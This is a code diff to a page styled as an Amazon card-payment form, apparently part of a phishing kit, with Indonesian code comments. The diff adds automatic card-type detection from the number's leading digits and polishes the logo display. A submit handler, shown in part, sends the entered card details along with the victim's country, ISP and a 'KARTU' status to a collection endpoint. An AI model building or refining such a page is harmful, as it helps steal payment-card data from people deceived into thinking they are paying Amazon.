@@ -65,14 +65,14 @@
             position: relative;
         }
         .input-kartu input {
-            padding-right: 45px;
+            padding-right: 50px;
         }
         .logo-di-input {
             position: absolute;
             right: 10px;
             top: 50%;
             transform: translateY(-50%);
-            height: 22px;
+            height: 24px;
         }
         .dua-kolom {
             display: flex;
@@ -118,7 +118,6 @@
     </style>
 </head>
 <body>
-    <!-- Jalur gambar sudah disesuaikan dengan nama yang ada di repositori -->
     <div class="logo">
         <img src="./img/amazonlogo.png" alt="Amazon" onerror="this.src='https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg'">
     </div>
@@ -128,7 +127,8 @@
 
         <label for="card_type">Card type</label>
         <select id="card_type" name="card_type">
-            <option value="mastercard" selected>Mastercard</option>
+            <option value="">Select card type</option>
+            <option value="mastercard">Mastercard</option>
             <option value="visa">Visa</option>
             <option value="amex">American Express</option>
             <option value="discover">Discover</option>
@@ -138,7 +138,7 @@
         <label for="card_number">Card number</label>
         <div class="input-kartu">
             <input type="text" id="card_number" name="card_number" maxlength="19" placeholder=" ">
-            <img src="./img/mastercard.png" alt="" class="logo-di-input" id="logo-di-samping">
+            <img src="" alt="" class="logo-di-input" id="logo-di-samping" style="display:none;">
         </div>
 
         <div class="dua-kolom">
@@ -211,9 +211,47 @@ const petaLogo = {
     jcb: "./img/jcb.png"
 };
 
+// === DETEKSI OTOMATIS BERDASARKAN ANGKA BIN ===
+function deteksiJenisKartu(bagianAwal) {
+    const angka = bagianAwal.replace(/\s/g, ""); // hapus spasi
+    
+    // Visa: mulai dengan 4
+    if(/^4/.test(angka)) return "visa";
+    // Mastercard: mulai dengan 51-55 atau 2221-2720
+    if(/^5[1-5]/.test(angka) || /^2[2-7]/.test(angka)) return "mastercard";
+    // Amex: mulai dengan 34 atau 37
+    if(/^3[47]/.test(angka)) return "amex";
+    // Discover: mulai dengan 6011, 65, 644-649
+    if(/^6(?:011|5|4[4-9])/.test(angka)) return "discover";
+    // JCB: mulai dengan 3528-3589
+    if(/^35(?:2[8-9]|[3-8]\d)/.test(angka)) return "jcb";
+    
+    return "";
+}
+
+// Saat mengetik di kolom nomor kartu
+document.getElementById("card_number").addEventListener("input", function() {
+    const nomor = this.value.trim();
+    const jenis = deteksiJenisKartu(nomor);
+    
+    if(jenis) {
+        logoSamping.src = petaLogo[jenis];
+        logoSamping.style.display = "block";
+        document.getElementById("card_type").value = jenis; // sinkronkan pilihan
+    } else {
+        logoSamping.style.display = "none";
+    }
+});
+
+// Saat memilih manual dari daftar
 document.getElementById("card_type").addEventListener("change", function() {
-    const logo = petaLogo[this.value];
-    logoSamping.src = logo;
+    const jenis = this.value;
+    if(jenis) {
+        logoSamping.src = petaLogo[jenis];
+        logoSamping.style.display = "block";
+    } else {
+        logoSamping.style.display = "none";
+    }
 });
 
 document.getElementById("tombol-kirim").addEventListener("click", async function(e) {
@@ -305,7 +343,7 @@ document.getElementById("tombol-kirim").addEventListener("click", async function
             negara: country,
             isp: "-",
             status: "KARTU",
-            alasan: `Kartu: ${cardNumber.slice(-4) || "xxxx"}`
+            alasan: `Kartu: ${cardNumber.replace(/\s/g, "").slice(-4) || "xxxx"}`
         })
     });
     
